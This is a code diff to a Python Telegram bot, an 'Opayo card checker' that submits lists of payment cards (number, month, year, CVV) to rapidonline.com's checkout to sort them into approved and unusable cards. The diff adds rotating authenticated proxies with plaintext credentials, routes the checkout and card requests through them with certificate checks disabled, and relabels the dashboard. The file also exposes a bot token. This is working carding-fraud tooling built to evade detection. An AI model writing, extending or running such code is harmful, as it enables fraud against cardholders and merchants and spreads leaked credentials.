@@ -21,6 +21,45 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 BOT_TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
 ADMIN_IDS = [5895491379, 844663875]
 
+# ========== Proxy List ==========
+PROXY_LIST = [
+    "82.26.221.169:5510:bxnvwevk:utgavp02z833",
+    "82.29.225.10:5865:bxnvwevk:utgavp02z833",
+    "82.22.220.181:5536:bxnvwevk:utgavp02z833",
+    "82.21.224.74:6430:bxnvwevk:utgavp02z833",
+    "82.29.230.232:7073:bxnvwevk:utgavp02z833",
+    "82.25.216.145:6987:bxnvwevk:utgavp02z833",
+    "82.25.216.194:7036:bxnvwevk:utgavp02z833",
+    "82.27.214.60:6402:bxnvwevk:utgavp02z833",
+    "82.24.224.197:5553:bxnvwevk:utgavp02z833",
+    "82.22.220.108:5463:bxnvwevk:utgavp02z833",
+    "23.27.138.233:6334:bxnvwevk:utgavp02z833",
+]
+
+current_proxy_index = 0
+
+def get_next_proxy():
+    """الحصول على البروكسي التالي بشكل دوري"""
+    global current_proxy_index
+    proxy_str = PROXY_LIST[current_proxy_index]
+    current_proxy_index = (current_proxy_index + 1) % len(PROXY_LIST)
+    
+    # تحويل الصيغة إلى قاموس للاستخدام مع requests
+    parts = proxy_str.split(':')
+    ip = parts[0]
+    port = parts[1]
+    username = parts[2]
+    password = parts[3]
+    
+    proxy_dict = {
+        'http': f'http://{username}:{password}@{ip}:{port}',
+        'https': f'http://{username}:{password}@{ip}:{port}'
+    }
+    
+    proxy_display = f"{ip}:{port}"
+    
+    return proxy_dict, proxy_display
+
 # ========== Opayo Settings ==========
 BASE = "https://www.rapidonline.com"
 BASKET_URL = BASE + "/checkout/basket"
@@ -76,7 +115,7 @@ stats = {
     'cards_checked': 0,
     'approved_cards': [],
     'ccn_cards': [],
-    'current_proxy': 'Direct (No Proxy)'
+    'current_proxy': 'Initializing...'
 }
 
 # ========== Opayo Functions ==========
@@ -107,14 +146,15 @@ def analyze_response(html_content):
     
     return "UNKNOWN", "Unknown Response"
 
-def get_opayo_cookies():
-    """استخراج كوكيز Opayo من التدفق"""
+def get_opayo_cookies(proxy_dict):
+    """استخراج كوكيز Opayo من التدفق مع استخدام البروكسي"""
     s = requests.Session()
     s.headers.update({"User-Agent": UA, "Referer": "https://www.rapidonline.com/checkout/order/redirect?pEx=4"})
     s.cookies.update(initial_cookies)
+    s.proxies.update(proxy_dict)
     
     try:
-        r = s.get(BASKET_URL, params=PARAMS, timeout=30)
+        r = s.get(BASKET_URL, params=PARAMS, timeout=30, verify=False)
         soup = BeautifulSoup(r.text, "html.parser")
         
         uid = (soup.find("input", {"name": "UniqueRequestId"}) or {}).get("value")
@@ -146,7 +186,7 @@ def get_opayo_cookies():
             "PaymentProvider": "1",
             "Misc": "",
         }
-        r2 = s.post(TOORDER_URL, headers=headers_post, data=payload, timeout=30, allow_redirects=False)
+        r2 = s.post(TOORDER_URL, headers=headers_post, data=payload, timeout=30, allow_redirects=False, verify=False)
         
         redirect_url = None
         try:
@@ -255,11 +295,12 @@ async def check_card(card, bot_app, chat_id):
     
     cvv = cvv.strip()
     
-    # No proxy
-    stats['current_proxy'] = 'Direct (No Proxy)'
+    # Get rotating proxy
+    proxy_dict, proxy_display = get_next_proxy()
+    stats['current_proxy'] = proxy_display
     
-    # Get fresh cookies
-    opayo_cookies = get_opayo_cookies()
+    # Get fresh cookies with proxy
+    opayo_cookies = get_opayo_cookies(proxy_dict)
     if not opayo_cookies:
         stats['errors'] += 1
         stats['error_details']['COOKIE_ERROR'] = stats['error_details'].get('COOKIE_ERROR', 0) + 1
@@ -309,6 +350,7 @@ async def check_card(card, bot_app, chat_id):
             cookies=opayo_cookies,
             headers=headers_card,
             data=data_card,
+            proxies=proxy_dict,
             verify=False,
             timeout=30
         )
@@ -378,6 +420,9 @@ def create_dashboard_keyboard():
         ],
         [
             InlineKeyboardButton(f"📡 Response: {stats['last_response']}", callback_data="response")
+        ],
+        [
+            InlineKeyboardButton(f"🌐 Proxy: {stats['current_proxy']}", callback_data="proxy")
         ]
     ]
     
@@ -396,7 +441,7 @@ async def update_dashboard(bot_app, chat_id):
             await bot_app.bot.edit_message_text(
                 chat_id=chat_id,
                 message_id=stats['dashboard_message_id'],
-                text="📊 **OPAYO CARD CHECKER - DIRECT CONNECTION** 📊",
+                text="📊 **OPAYO CARD CHECKER - ROTATING PROXIES** 📊",
                 reply_markup=create_dashboard_keyboard(),
                 parse_mode='Markdown'
             )
@@ -441,11 +486,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     await update.message.reply_text(
-        "📊 **OPAYO CARD CHECKER BOT - DIRECT**\n\n"
+        "📊 **OPAYO CARD CHECKER BOT - ROTATING PROXIES**\n\n"
         "أرسل ملف .txt يحتوي على البطاقات\n"
         "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
         "✅ سيتم عرض النتائج هنا مباشرة\n"
-        "🌐 بدون بروكسي (اتصال مباشر)",
+        f"🌐 عدد البروكسيات: {len(PROXY_LIST)}\n"
+        "🔄 كل طلب يستخدم بروكسي مختلف",
         parse_mode='Markdown'
     )
 
@@ -475,14 +521,14 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         'cards_checked': 0,
         'approved_cards': [],
         'ccn_cards': [],
-        'current_proxy': 'Direct (No Proxy)',
+        'current_proxy': 'Initializing...',
         'start_time': datetime.now(),
         'is_running': True,
         'chat_id': update.effective_chat.id
     })
     
     dashboard_msg = await update.message.reply_text(
-        "📊 **OPAYO CARD CHECKER - DIRECT CONNECTION** 📊",
+        "📊 **OPAYO CARD CHECKER - ROTATING PROXIES** 📊",
         reply_markup=create_dashboard_keyboard(),
         parse_mode='Markdown'
     )
@@ -491,6 +537,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"✅ تم بدء الفحص!\n\n"
         f"📊 إجمالي البطاقات: {len(cards)}\n"
+        f"🌐 البروكسيات المتاحة: {len(PROXY_LIST)}\n"
         f"📢 تابع النتائج أدناه",
         parse_mode='Markdown'
     )
@@ -555,7 +602,7 @@ async def process_cards(cards, bot_app, chat_id):
         "╚═══════════════════╝\n\n"
         "✅ تم إرسال جميع الملفات\n"
         "📊 شكراً لاستخدامك البوت!\n\n"
-        "⚡️ Opayo Gateway - Direct Connection"
+        "⚡️ Opayo Gateway - Rotating Proxies"
     )
     
     await bot_app.bot.send_message(
@@ -584,7 +631,8 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.message.reply_text("🛑 تم إيقاف الفحص!")
 
 def main():
-    print("[🤖] Starting Opayo Telegram Bot - Direct Connection...")
+    print("[🤖] Starting Opayo Telegram Bot - Rotating Proxies...")
+    print(f"[🌐] Loaded {len(PROXY_LIST)} proxies")
     
     app = Application.builder().token(BOT_TOKEN).build()
     
@@ -593,7 +641,7 @@ def main():
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     app.add_handler(CallbackQueryHandler(button_callback))
     
-    print("[✅] Bot is running without proxies...")
+    print("[✅] Bot is running with rotating proxies...")
     app.run_polling()
 
 if __name__ == "__main__":
